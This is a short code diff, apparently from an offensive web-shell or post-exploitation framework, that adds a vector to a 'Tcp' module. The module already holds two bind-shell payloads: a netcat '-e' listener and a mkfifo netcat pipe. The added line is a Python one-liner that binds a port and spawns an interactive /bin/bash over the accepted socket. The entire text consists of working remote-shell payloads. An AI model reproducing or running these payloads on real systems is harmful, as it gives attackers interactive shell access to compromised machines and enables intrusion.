@@ -16,6 +16,7 @@ class Tcp(ModuleGuess):
 
         self.vectors.add_vector('netcat-traditional','shell.sh',  """nc -l -p $port -e $shell""")
         self.vectors.add_vector('netcat-bsd', 'shell.sh', """rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc -l $port >/tmp/f; rm -rf /tmp/f""")
+        self.vectors.add_vector('python-pty','shell.sh',  """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", $port));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("/bin/bash");s.close()';""")
             
 
 
